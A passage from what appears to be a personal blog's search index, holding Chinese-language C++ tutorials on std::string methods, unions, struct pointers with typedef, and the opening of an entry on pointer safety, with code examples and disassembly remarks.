class="built_in">length</span>() &lt;&lt; std::endl;</span><br></pre></td></tr></table></figure><p>效果就是：<img src="/2022/05/24/string1/007.png" class=""><br>当然length的返回值也可以赋值给一个int类型的变量，以作重复使用。</p><blockquote><p>然后同样的问题，对中文的支持都是很玄学，毕竟各字符集对中文占用大小并不统一</p></blockquote><hr><h3 id=""><a href="#" class="headerlink" title="[]"></a>[]</h3><p>string也可以通过[]去访问字符串成员，下标依然0起，底层实现也是类似的，使用的内存空间也是连续的。<br>就没什么必要演示了</p><hr><h3 id="判断"><a href="#判断" class="headerlink" title="判断"></a>判断</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *ch = (<span class="type">char</span>*)<span class="string">&quot;123456&quot;</span>;</span><br><span class="line"><span class="type">char</span> *ch1 = (<span class="type">char</span>*)<span class="string">&quot;123456&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(ch == ch1)</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;=&quot;</span> &lt;&lt; std::endl;</span><br></pre></td></tr></table></figure><p>在C语言里，字符串其实没有一个很准确的比较功能，像上述的代码中，能够判断也是因为二者的初始化时相当于使用了常量，而编译器恰好优化了常量，使常量的地址一致，所以才会判断相等<br>结果就是：<img src="/2022/05/24/string1/008.png" class=""></p><p>反汇编看两个初始值的情况</p><img src="/2022/05/24/string1/009.png" class=""><p>可以看到”123456“的十六进制值是相同的，所以比较的时候才相等。<br>但是这种比较方法很显然不靠谱。防止编译器优化的话，就需要其中一个字符串通过手动输入，这样就不能一下子确认为是常量。</p><p>但其实也有一个方法strcmp，不过就得借用string.h头文件了，也就是变相借助了工具，所以说原生下没有这种功能。<br><code>int strcmp(const char* str1，const char* str2);</code><br>返回值：</p><ul><li>如果返回值 &lt; 0，则表示 str1 小于 str2。</li><li>如果返回值 &gt; 0，则表示 str2 小于 str1。</li><li>如果返回值 &#x3D; 0，则表示 str1 等于 str2。</li></ul><p>而string的话，它肯定是内置了不少方法的:&#x3D;&#x3D; !&#x3D; &gt; &lt; &gt;&#x3D; &lt;&#x3D;<br>原则就是根据顺序，依次比较字符大小，在第一个字符就分出大小则就无视后面的字符，如果第一个字符相等就往后比较以此类推。</p><hr><h3 id="compare"><a href="#compare" class="headerlink" title="compare"></a>compare</h3><p>string类型自带的方法，返回值是int类型的值</p><ul><li>两个字符串完全相等返回0</li><li>相比比较的字符串小返回负数</li><li>相比比较的字符串大返回正数</li></ul><p>所以if的时候要注意，因为使用compare如果相等返回的是0，0在C语言cpp里面是表示假的。</p><p><code>.compare(index, end, str)</code>这是一个拓展的参数，可以指定被比较的字符串从哪里开始到哪里结束。</p><hr><h3 id="find"><a href="#find" class="headerlink" title="find"></a>find</h3><p><code>.find(str)</code>,find的返回值是一个整型，它可以找到str第一次出现的下标。</p><p>使用场景的话，最常用的就是substr的时候，找到原字符串内的某一块内容，用find当起始值。<br><code>.find(str,index)</code>  从要比较的字符串的index处包括index开始查找，返回值是std::string::npos 可能是-1或者4294967295<br><code>.find(str,index,end)</code> 从要被比较的字符串index处开始查找，范围是{str[0],str[end]}</p><hr><h3 id="rfind"><a href="#rfind" class="headerlink" title="rfind"></a>rfind</h3><p>这玩意。。就是倒着搜的find。<br>所以指定index的时候要从最后面开始，从0开始没遇到直接就罢工了。。<br>这玩意用的真的挺少的感觉。</p><hr><h3 id="insert"><a href="#insert" class="headerlink" title="insert"></a>insert</h3><p>string的插入方法，参数小多<br><code>.insert(要插入的位置，要插入的字符串，要插入的字符串起始位置，要插入的大小);</code><br><code>.insert(要插入的位置，要插入的字符串，要插入的大小);</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">string str = <span class="string">&quot;abc,&quot;</span>;</span><br><span class="line">str.<span class="built_in">insert</span>(<span class="number">3</span>,<span class="string">&quot;123&quot;</span>,<span class="number">3</span>);</span><br></pre></td></tr></table></figure><hr><h3 id="replace"><a href="#replace" class="headerlink" title="replace"></a>replace</h3><p>string的内置方法，可以指定替换string中的内容<br><code>.replace(index, length, &quot;str&quot;)</code><br><code>.replace(index, length, &quot;char length&quot;, char)</code><br><code>.replace(起始位置，要替换长度，替换内容，替换后容节选长度)</code><br><code>.replace(起始位置，要替换长度，替换内容，替换后内容的起始位置，替换后容节选长度)</code></p><p>例一：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">string str = <span class="string">&quot;id=001;&quot;</span>;</span><br><span class="line">str.<span class="built_in">replace</span>(<span class="number">3</span>, <span class="number">4</span>, <span class="string">&quot;003&quot;</span>);</span><br></pre></td></tr></table></figure><p>那么打印str之后的内容就会是<code>id=003</code></p><p>例二：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">string str = <span class="string">&quot;abcde;&quot;</span>;</span><br><span class="line">str.<span class="built_in">replace</span>(<span class="number">3</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="string">&#x27;*&#x27;</span>);</span><br></pre></td></tr></table></figure><p>那么打印str之后的内容就会是<code>abc******</code>;</p><p>例三：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">string str = <span class="string">&quot;id=001;&quot;</span>;</span><br><span class="line">str.<span class="built_in">replace</span>(<span class="number">3</span>,<span class="number">4</span>,<span class="string">&quot;zhangsan;name=hhh;&quot;</span>,<span class="number">8</span>);</span><br></pre></td></tr></table></figure><p>str为<code>id=zhangsan;</code></p><p>例四：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">string str = <span class="string">&quot;id=001;&quot;</span>;</span><br><span class="line">str.<span class="built_in">replace</span>(<span class="number">3</span>,<span class="number">4</span>,<span class="string">&quot;zhangsan;name=hhh;&quot;</span>,<span class="number">5</span>,<span class="number">8</span>);</span><br></pre></td></tr></table></figure><p>str为<code>id=san;</code></p><blockquote><p>其实后面几个用的也不多</p></blockquote><hr><h3 id="erase"><a href="#erase" class="headerlink" title=".erase"></a>.erase</h3><p>能替换，也能删除<br><code>.erase(删除的起始位置)</code><br><code>.erase(删除起始位置，删除的长度)</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">string str = <span class="string">&quot;id=001;&quot;</span></span><br><span class="line">str.<span class="built_in">erase</span>(<span class="number">3</span>);</span><br></pre></td></tr></table></figure><p>str显示为<code>id=</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">string str = <span class="string">&quot;id=001;&quot;</span></span><br><span class="line">str.<span class="built_in">erase</span>(<span class="number">3</span>,<span class="number">4</span>);</span><br></pre></td></tr></table></figure><p>str显示为<code>id=</code></p><hr><h3 id="clear"><a href="#clear" class="headerlink" title="clear"></a>clear</h3><p>顾名思义就是清除，对应的就是清空字符串的内容。<br>就不演示了，反正使用了之后在打印字符串就是空的</p><hr><h1 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h1><p><code>string str = &quot;id=xxx;name=xxx;sex=x;phone=xxxxxxx;&quot;;</code><br>假设有这么一句字符串，需要你实现输入选项如id，拆解出id&#x3D;后面的参数，不含;</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    string str = <span class="string">&quot;id=1;name=hhh;sex=1;phone=110154654&quot;</span>;</span><br><span class="line">    string sIN,sOut;</span><br><span class="line"></span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;请输入查找关键字：\n&quot;</span>;</span><br><span class="line">    std::cin &gt;&gt; sIn;</span><br><span class="line">    <span class="type">int</span> flag = str.<span class="built_in">find</span>(<span class="string">&quot;sIn&quot;</span>+<span class="string">&quot;=&quot;</span>); <span class="comment">//加上等于才是完整的表达式</span></span><br><span class="line">    <span class="keyword">if</span>(flag == std::string::nopos)</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;所查找关键字不存在！\n&quot;</span>;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="type">int</span> len = str.<span class="built_in">find</span>(<span class="string">&quot;;&quot;</span>,flag);</span><br><span class="line">        sOut = str.<span class="built_in">substr</span>(flag + sIn.<span class="built_in">length</span>()+<span class="number">1</span>, len - flag - sIn.<span class="built_in">length</span>()<span class="number">-1</span>);</span><br><span class="line">        std::cout &lt;&lt; sOut &lt;&lt; std::endl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>内置的方法还是香的，自己能造出轮子也不失为一种办法。</p>]]></content>
      
      
      <categories>
          
          <category> cpp学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>union</title>
      <link href="/2022/05/23/union/"/>
      <url>/2022/05/23/union/</url>
      
        <content type="html"><![CDATA[<h1 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h1><ul><li><strong>union （共用声明和共用一变量定义）</strong></li></ul><span id="more"></span><hr><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>union跟struct有相似的地方，但是union又叫做联合体或共用体，也就意味着它在内存存储上会和正常的有区别。</p><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>写法和结构体差不多：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="title class_">unionName</span>&#123;</span><br><span class="line">    type <span class="keyword">typename</span>;</span><br><span class="line">    type <span class="keyword">typename</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><strong>注意：union之间的成员共享内存，也就意味着union的内存占用会根据最大的成员而定义。</strong></p><hr><h2 id="No-1"><a href="#No-1" class="headerlink" title="No.1"></a>No.1</h2><p>首先自定义一个联合体</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="title class_">hh</span>&#123;</span><br><span class="line"><span class="type">short</span> sh;</span><br><span class="line"><span class="type">int</span> in;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>先给实例一个hh，然后给小的变量赋值</p><img src="/2022/05/23/union/000.png" class=""><p>sizeof能看到是四个字节，也就是印证他会根据联合体里面最大的变量类型扩充。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="title class_">hh</span>&#123;</span><br><span class="line"><span class="type">short</span> sh;</span><br><span class="line"><span class="type">int</span> in;</span><br><span class="line"><span class="type">double</span> dou;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在联合体里再放一个double类型</p><img src="/2022/05/23/union/001.png" class=""><p>发现结构体H的占用大小变成了8字节。</p><blockquote><p>可以确定联合体的内存大小由最大成员定义</p></blockquote><hr><h2 id="No-2"><a href="#No-2" class="headerlink" title="No.2"></a>No.2</h2><p>那么说联合体共享内存空间，那么给short类型变量赋值之后，int和double会不会也是跟short变量一样的值？</p><img src="/2022/05/23/union/002.png" class=""><p>显然是不一样的。</p><p>乱码的情况大多是没有初始化，如果说给其他成员尝试初始化呢<br>但是要注意联合体的初始化有点不一样。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="title class_">hh</span>&#123;</span><br><span class="line"><span class="type">short</span> sh;</span><br><span class="line"><span class="type">int</span> in;</span><br><span class="line"><span class="type">double</span> dou;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    hh H&#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在实例化一个对象的时候直接初始化0看似没什么问题，但是由于联合体共享内存的特性，这个0初始化可能是给了第一个成员，后面的成员会不会初始化则不好说，况且不同的编译器还有一定的优化特性。</p><p>所以保守起见就手动初始化</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hh H;</span><br><span class="line">H.in = <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>再手动初始化成员后，能看到</p><img src="/2022/05/23/union/003.png" class=""><p>in的值变成和sh的值一样，但是这个是in初始化在前，sh赋值在后，如果调换一下位置</p><img src="/2022/05/23/union/004.png" class=""><p>会发现成员的值是会根据最后一次赋值而改变。</p><hr><h2 id="No-3"><a href="#No-3" class="headerlink" title="No.3"></a>No.3</h2><p>short占用两字节，int占用四字节，如果是一个负数，在short和int下又会发生不一样的解读</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">hh H;</span><br><span class="line">H.in = <span class="number">0</span>;</span><br><span class="line">H.sh = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">std::cout &lt;&lt; <span class="built_in">sizeof</span>(H) &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; H.sh &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; H.in &lt;&lt; std::endl;</span><br></pre></td></tr></table></figure><img src="/2022/05/23/union/005.png" class=""><p>short的 -1 原码表示 <code>1000 0000 0000 0001</code>，反码<code>1111 1111 1111 1110</code>，补码<code>1111 1111 1111 1111</code>,十六进制合计0xffff。无非就是表示-1或65535<br>但是int占四字节，0xffff在int里就不会是一个负数。</p><hr><h2 id="No-4"><a href="#No-4" class="headerlink" title="No.4"></a>No.4</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">std::cout &lt;&lt; &amp;H.sh &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; &amp;H.in &lt;&lt; std::endl;</span><br></pre></td></tr></table></figure><img src="/2022/05/23/union/006.png" class=""><p>再看地址是一样的，也就是说共享了内存地址。</p><hr><h1 id="匿名结构体和联合体"><a href="#匿名结构体和联合体" class="headerlink" title="匿名结构体和联合体"></a>匿名结构体和联合体</h1><p>匿名自然就是不声明类型名称</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> &#123;</span><br><span class="line"><span class="type">short</span> sh;</span><br><span class="line"><span class="type">int</span> in;</span><br><span class="line"><span class="type">double</span> dou;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>当然直接声明好似没什么意义，编译器也会给出报错</p><img src="/2022/05/23/union/007.png" class=""><p>但是我们知道结构体能在}后面提前定义变量。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> &#123;</span><br><span class="line"><span class="type">short</span> sh;</span><br><span class="line"><span class="type">int</span> in;</span><br><span class="line"><span class="type">double</span> dou;</span><br><span class="line">&#125;un;</span><br></pre></td></tr></table></figure><p>un自然也能进行赋值之类的操作，但是没有复用性，下次还想实例一个un结构类型的联合体只能重新定义一个联合体在实例化就会变得很麻烦。</p><p>所以匿名联合体的场景自然是不复用的前提下，比如嵌套在某处</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">st</span>&#123;</span><br><span class="line"><span class="keyword">union</span>&#123;</span><br><span class="line"><span class="type">int</span> a;</span><br><span class="line"><span class="type">char</span> b;</span><br><span class="line"><span class="type">double</span> c;</span><br><span class="line">&#125;un;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在这种情况下，联合体没必要复用，因为他就是结构体当中的成员，还可以给结构体节省点内存，毕竟三个成员不一定都用得上。</p><p>结构体同样能匿名，只不过使用前都得提前在后面声明一个变量</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> &#123;</span><br><span class="line">    <span class="type">int</span> a;</span><br><span class="line">&#125;st;</span><br></pre></td></tr></table></figure><p>赋值操作也都一样的，还是那句话缺少了复用性，匿名联合体可以被嵌套在结构体了，那么匿名结构体也会有相应的嵌套场所，比如说类当中。</p><p>但是匿名的情况还算少的，所以了解个大概就行了。</p><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>莫的感情~都差不多</p>]]></content>
      
      
      <categories>
          
          <category> cpp学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>structPointer</title>
      <link href="/2022/05/21/structPointer/"/>
      <url>/2022/05/21/structPointer/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>结构体也不算陌生，特殊的是给结构体赋值的时候。</p><span id="more"></span><hr><h1 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">Box</span>&#123;</span><br><span class="line"><span class="type">int</span> a;</span><br><span class="line"><span class="type">int</span> b;</span><br><span class="line">&#125;box,*PBox;</span><br></pre></td></tr></table></figure><p><code>typedef</code>是起到一个起别名的作用，例如我们声明<code>typedef int in;</code>，那么后面定义一个int变量的时候就可以<code>in a = 0;</code>。<br><code>struct</code>是声明结构体类型的关键字，在固有印象里结构体应该是这样的：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">HHH</span>&#123;</span><br><span class="line">    <span class="type">int</span> x;</span><br><span class="line">    <span class="type">int</span> y;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>定义一个HHH结构体时，我们可以用<code>HHH h;</code>或者<code>struct HHH h;</code><br>当我们在结构体后面放置额外的变量名时：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">HHH</span>&#123;</span><br><span class="line">    <span class="type">int</span> x;</span><br><span class="line">    <span class="type">int</span> y;</span><br><span class="line">&#125;h1,h2[<span class="number">10</span>],*h3;</span><br></pre></td></tr></table></figure><p>这个时候后面的三个变量名就是表面我们再创建结构体HHH的时候同时声明了三个HHH类型的变量，一个正常的HHH h1，一个长度为10的结构体数组，以及一个指向这种结构体的指针。</p><p>然后回到我们刚开始说的：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">Box</span>&#123;</span><br><span class="line"><span class="type">int</span> a;</span><br><span class="line"><span class="type">int</span> b;</span><br><span class="line">&#125;box,*PBox;</span><br></pre></td></tr></table></figure><p>那么这个时候box还是一个提前定义的Box box变量吗？<br>答案肯定是否，因为typedef是起别名的作用，那么跟随在后的变量名，都将是结构体Box的小名。<br>*PBox理解就是<code>typedef Box *PBox</code>,说人话就是将Box的指针写法改名，声明变量的时候使用PBox xx,就可以不用再加*号。</p><img src="/2022/05/21/structPointer/000.png" class=""><p><strong>注意：别名起的跟结构体名称一致无意义，且指针类型时也不允许跟结构体重名</strong></p><hr><h1 id="前言-1"><a href="#前言-1" class="headerlink" title="前言"></a>前言</h1><p>大致回忆一下结构体的用法</p><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">Box</span>&#123;</span><br><span class="line"><span class="type">int</span> a;</span><br><span class="line"><span class="type">int</span> b;</span><br><span class="line">&#125;box,*PBox;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">box b;</span><br><span class="line"><span class="comment">//Box b1;</span></span><br><span class="line"><span class="comment">//struct Box b2;</span></span><br><span class="line">PBox pb;</span><br><span class="line"></span><br><span class="line">pb-&gt;a = <span class="number">10</span>;</span><br><span class="line">pb-&gt;b = <span class="number">20</span>;</span><br><span class="line">b.a = <span class="number">10</span>;</span><br><span class="line">b.b = <span class="number">20</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>b.a</code>是我们正常使用结构体访问成员的时候的用法，但是发现在指针的情况下，访问方式变成了<code>-&gt;</code>。<br>不过<code>-&gt;</code>这种方式在class的时候才会有更直观的体会，目前先不管，只需要知道指针类型结构体访问成员使用<code>-&gt;</code>即可。</p><hr><h2 id="结构体在反汇编下"><a href="#结构体在反汇编下" class="headerlink" title="结构体在反汇编下"></a>结构体在反汇编下</h2><img src="/2022/05/21/structPointer/001.png" class=""><p>这里有点有意思的就是能看到我们在源代码里是清清楚楚明明白白真真切切的声明了结构体，但是反汇编下却没有对于结构体的代码，要知道汇编是源代码翻译过来的产物。</p><p>大致上的理解可以认为结构体就是自定义变量类型，类似于int，char之类的，计算机在编译的时候不会翻出它们的源代码，但是计算机已经能知道它们所需要的空间。我们声明的box里面有两个int变量，int类型在内存占用四字节，所以计算机就会把前面的四字节认作为box.a，后四字节认为是box.b。</p><hr><h2 id="指针结构体的地址问题"><a href="#指针结构体的地址问题" class="headerlink" title="指针结构体的地址问题"></a>指针结构体的地址问题</h2><p>指针自然是需要申请地址或者指向一块地址，但是堆区的数据较为灵活，属于不确定率高的，而栈区则是有可能被查出的，或者说通过偏移量去计算。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">box b;</span><br><span class="line">Box b1;</span><br><span class="line">PBox pb = <span class="keyword">new</span> Box;</span><br><span class="line">PBox pb1 = &amp;b1;</span><br></pre></td></tr></table></figure><p>反汇编可能不会很明显，但是浅看地址偏移量看个大概吧</p><img src="/2022/05/21/structPointer/003.png" class=""><blockquote><p>首先就是new的时候反汇编的操作和后续给pb1赋值的时候ebp的偏移量和pb赋值的偏移量明显的差距。<br>最直观的就是new一个Box的时候，push了8，这就是两个int类型占用的大小</p></blockquote><p><strong>说到结构体大小，额外提一点内存对齐</strong></p><h3 id="内存对齐"><a href="#内存对齐" class="headerlink" title="内存对齐"></a>内存对齐</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">HHH</span>&#123;</span><br><span class="line"><span class="type">int</span> a;</span><br><span class="line"><span class="type">int</span> b;</span><br><span class="line"><span class="type">short</span> c;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>问，HHH结构体占用大小，凭借朴素的情感，4+4+2 &#x3D; 10。答案是错的，因为内存的逻辑顺序就是连续，所以当出现两个int之后，又出现了一个short，编译器就会对short进行填充优化变成四个字节，至于填充的字节默认下不使用。<br>当然内存对齐的参照有很多，会根据不同操作系统类型，或者不同的对齐倍数设置和整体之间的参照，此处简单过一遍。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">HHH</span>&#123;</span><br><span class="line"><span class="type">char</span> ch1;</span><br><span class="line"><span class="type">char</span> ch2;</span><br><span class="line"><span class="type">int</span> a;</span><br><span class="line"><span class="type">int</span> b;</span><br><span class="line"><span class="type">short</span> c;</span><br><span class="line"><span class="type">int</span> d;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>有兴趣也可以自己写然后计算一下，和sizeof做一个比较。</p></blockquote><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>结构体指针其实也没有太特殊，无非就是看重一点内存和访问方式吧。</p>]]></content>
      
      
      <categories>
          
          <category> cpp学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pointer安全</title>
      <link href="/2022/05/20/pointerText/"/>
      <url>/2022/05/20/pointerText/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>对指针已经有了大致了解，那么对于指针的安全性也需要有一定把握</p><span id="more"></span><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> *p;</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> *a = <span class="keyword">new</span> <span class="type">int</span>[<span class="number">10</span>];</span><br><span class="line">        p = a;</span><br><span class="line">        p[<span class="number">0</span>] = <span class="number">250</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么当指针p new的内存没有delete的时候，分配到的内存还会存在吗？<br>可以通过输出p[0]的值看看<img src="/2022/05/20/pointerText/000.png" class=""><br>发现仍然有值，这个时候这个指针p就被称为悬挂指针，也就是常说的野指针。</p><blockquote><p>解决这种粗心的办法可以用智能指针</p></blockquote><hr><h2 id="No-1"><a href="#No-1" class="headerlink" title="No.1"></a>No.1</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> *p;</span><br><span class="line">    